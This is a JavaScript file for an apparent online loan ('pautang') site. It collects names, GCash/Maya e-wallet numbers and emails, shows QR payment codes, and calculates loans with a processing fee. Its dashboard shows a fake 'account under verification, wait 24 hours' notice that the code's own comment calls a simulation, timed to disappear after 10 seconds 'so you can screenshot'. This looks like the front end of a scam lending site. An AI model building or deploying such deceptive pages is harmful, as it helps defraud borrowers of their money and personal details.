// falling money generator
(function(){
  const moneyBox = document.createElement('div');
  moneyBox.className='money';
  document.body.appendChild(moneyBox);
  const symbols = ['₱','$'];
  const colors = ['rgba(255,255,255,0.12)','rgba(255,255,255,0.08)','rgba(255,255,255,0.06)'];
  for(let i=0;i<24;i++){
    const el = document.createElement('div');
    el.className='coin';
    el.style.left = Math.random()*100+'%';
    el.style.fontSize = (12+Math.random()*34)+'px';
    el.style.animationDuration = (6+Math.random()*8)+'s';
    el.style.opacity = (0.5+Math.random()*0.7);
    el.style.color = colors[Math.floor(Math.random()*colors.length)];
    el.style.transform = 'translateX(0)';
    el.textContent = symbols[Math.random()>0.5?0:1];
    moneyBox.appendChild(el);
  }
})();

// basic helper
function $q(sel){return document.querySelector(sel)}

// Login behavior
function setupLogin(){
  const loginForm = $q('#login-form');
  if(!loginForm) return;
  loginForm.addEventListener('submit', function(e){
    e.preventDefault();
    const first = $q('#first').value.trim();
    const last = $q('#last').value.trim();
    const num = $q('#gcash').value.trim();
    const email = $q('#email').value.trim();
    if(!/^\d{11}$/.test(num)){ alert('GCASH/MAYA number must be 11 digits'); return; }
    const user = {first,last,num,email,remember:!!$q('#remember').checked};
    localStorage.setItem('pautang_user', JSON.stringify(user));
    // set pending flag and redirect to files page
    localStorage.setItem('pautang_pending_verification','1');
    location.href = 'files.html';
    alert('Saved. Please reload the site to verify your account as requested.');
  });

  // on load, if pending flag present, show banner
  if(localStorage.getItem('pautang_pending_verification')){
    const b = document.createElement('div');
    b.style.background='rgba(255,255,255,0.12)';
    b.style.color='#fff';
    b.style.padding='10px';
    b.style.borderRadius='8px';
    b.style.marginTop='8px';
    b.textContent='Notice: A saved account exists. Reload the page to check if what you input is your real account (as requested).';
    document.querySelector('.container').prepend(b);
  }
}

// Files slideshow
function setupSlideshow(){
  const imgs = Array.from(document.querySelectorAll('.slide-img'));
  if(imgs.length===0) return;
  let idx = 0;
  function show(i){
    imgs.forEach((el,ii)=>el.style.display = ii===i?'block':'none');
  }
  show(idx);
  const auto = setInterval(()=>{ idx = (idx+1)%imgs.length; show(idx); }, 300);
  // manual controls
  document.getElementById('prev')?.addEventListener('click', ()=>{ idx = (idx-1+imgs.length)%imgs.length; show(idx); });
  document.getElementById('next')?.addEventListener('click', ()=>{ idx = (idx+1)%imgs.length; show(idx); });
  // allow manual slide with thumbnails
  document.querySelectorAll('.thumb').forEach((t,i)=> t.addEventListener('click', ()=>{ idx=i; show(idx); }));
}

// Dashboard setup
function setupDashboard(){
  const raw = localStorage.getItem('pautang_user');
  if(raw){
    const u = JSON.parse(raw);
    const hi = document.getElementById('hiuser');
    if(hi) hi.textContent = u.first + ' ' + u.last;
  }
  // show verification notification for 10s if pending (simulate 24-hour)
  if(localStorage.getItem('pautang_pending_verification')){
    const note = document.createElement('div');
    note.className='card';
    note.style.marginBottom='12px';
    note.textContent = 'Your account is under verification. Please wait 24 hours. (This notice will be visible for 10 seconds so you can screenshot.)';
    document.querySelector('.container').prepend(note);
    setTimeout(()=>note.remove(),10000);
  }
}

// Loan calculator
function setupLoan(){
  const btn = $q('#calcbtn');
  if(!btn) return;
  btn.addEventListener('click', function(){
    const amt = Number($q('#loanamount').value.replace(/[^0-9]/g,'')) || 0;
    const months = Number($q('#loanperiod').value);
    if(amt < 5000 || amt > 10000){ alert('Loan amount must be between ₱5,000 and ₱10,000'); return; }
    if(!(months===6||months===12)){ alert('Loan period must be 6 or 12 months'); return; }
    const rate = months===6?0.18:0.21;
    const interest = Math.round(amt * rate);
    const platformFee = 99.99;
    const total = amt + interest + platformFee;
    const monthly = Math.round((total / months)*100)/100;
    $q('#loanresult').innerHTML = `
      <p>Loan Amount: ₱${amt.toLocaleString()}</p>
      <p>Loan Period: ${months} months</p>
      <p>Interest: ₱${interest.toLocaleString()}</p>
      <p>Platform & Processing Fee: ₱${platformFee.toFixed(2)}</p>
      <p><strong>Total Payable: ₱${total.toLocaleString()}</strong></p>
      <p>Monthly Payment (due every 30th): ₱${monthly.toLocaleString()}</p>
    `;
  });
}

// modal for QR
function setupQR(){
  document.querySelectorAll('[data-qr]').forEach(btn=>{
    btn.addEventListener('click', ()=>{
      const src = btn.getAttribute('data-qr');
      const modal = $q('#qrmodal');
      $q('#qrimg').src = src;
      modal.style.display='flex';
    });
  });
  $q('#qrmodal')?.addEventListener('click', (e)=>{ if(e.target.id==='qrmodal') e.target.style.display='none'; });
}

document.addEventListener('DOMContentLoaded', function(){
  setupLogin(); setupSlideshow(); setupDashboard(); setupLoan(); setupQR();
});
